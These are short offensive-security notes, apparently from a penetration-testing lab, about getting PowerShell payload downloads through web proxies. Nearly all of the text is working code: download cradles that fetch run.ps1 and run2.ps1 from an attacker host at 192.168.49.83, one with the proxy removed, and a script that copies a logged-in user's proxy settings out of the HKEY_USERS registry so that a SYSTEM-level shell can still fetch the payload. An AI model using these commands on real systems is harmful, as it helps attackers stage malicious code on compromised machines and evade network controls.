**Checking to see if proxy set in powershell" **

[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.49.83/run.ps1")

** Remove proxy settings **

$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.49.83/run.ps1")

** Be aware that SYSTEM level shell often does not have the proxy settings maintained **
** You must create the proxy **
** Proxy settings are stored in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings **
** Copy from valid user with the following script: **

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.49.83/run2.ps1")

